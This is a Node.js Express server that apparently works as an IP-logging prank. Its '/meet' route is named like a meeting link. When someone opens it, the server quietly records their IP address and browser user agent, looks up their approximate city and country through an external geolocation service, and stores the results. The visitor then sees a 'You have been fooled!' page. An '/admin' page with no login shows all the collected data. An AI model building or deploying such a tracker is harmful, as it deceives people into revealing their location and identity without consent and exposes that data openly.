const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;

const FUNKY_IMAGE_URL = 'https://media.istockphoto.com/id/994269878/photo/the-rhesus-macaque.jpg?s=1024x1024&w=is&k=20&c=f7-S7OvIGUjo69BmOmOd_v4nryjD1YFB7NJjrkT4PDw=';
const VISIT_LOG_FILE = path.join(__dirname, 'visits.json');

let visits = [];

// Load previous visits from file
if (fs.existsSync(VISIT_LOG_FILE)) {
  try {
    const data = fs.readFileSync(VISIT_LOG_FILE);
    visits = JSON.parse(data);
  } catch (err) {
    console.error('⚠️ Error loading visit log:', err.message);
  }
}

function getRealIP(req) {
  const forwardedFor = req.headers['x-forwarded-for'];
  return forwardedFor ? forwardedFor.split(',')[0] : req.connection.remoteAddress;
}

function saveVisits() {
  fs.writeFileSync(VISIT_LOG_FILE, JSON.stringify(visits, null, 2));
}

app.get('/meet', async (req, res) => {
  const ip = getRealIP(req);
  const userAgent = req.headers['user-agent'];
  const timestamp = new Date().toISOString();

  let locationData = {
    city: 'Unknown',
    regionName: 'Unknown',
    country: 'Unknown'
  };

  try {
    const geoRes = await axios.get(`http://ip-api.com/json/${ip}`);
    if (geoRes.data.status === 'success') {
      locationData = geoRes.data;
    }
  } catch (err) {
    console.error('⚠️ Error fetching location:', err.message);
  }

  const visitData = {
    visit: visits.length + 1,
    ip,
    location: `${locationData.city}, ${locationData.regionName}, ${locationData.country}`,
    userAgent,
    time: timestamp
  };

  visits.push(visitData);
  saveVisits();

  console.table(visits);
  console.log(`🌍 Total Visits: ${visits.length}`);

  res.send(`
    <html>
      <head>
        <title>🎉 You Have Been Fooled! 🎉</title>
      </head>
      <body style="text-align:center; font-family:Arial, sans-serif;">
        <h1>🎉 You have been fooled!! 🎉</h1>
        <img src="${FUNKY_IMAGE_URL}" alt="Funky Image" style="width:90%; max-width:500px; border-radius:10px; margin:20px 0;">
      </body>
    </html>
  `);
});

// Admin dashboard
app.get('/admin', (req, res) => {
  let tableRows = visits.map(v => `
    <tr>
      <td>${v.visit}</td>
      <td>${v.ip}</td>
      <td>${v.location}</td>
      <td>${v.time}</td>
    </tr>
  `).join('');

  res.send(`
    <html>
      <head><title>Visitor Dashboard</title></head>
      <body style="font-family:sans-serif; padding:20px;">
        <h2>Total Visits: ${visits.length}</h2>
        <table border="1" cellpadding="10" cellspacing="0">
          <thead><tr><th>#</th><th>IP</th><th>Location</th><th>Time</th></tr></thead>
          <tbody>${tableRows}</tbody>
        </table>
      </body>
    </html>
  `);
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running at http://0.0.0.0:${PORT}`);
});
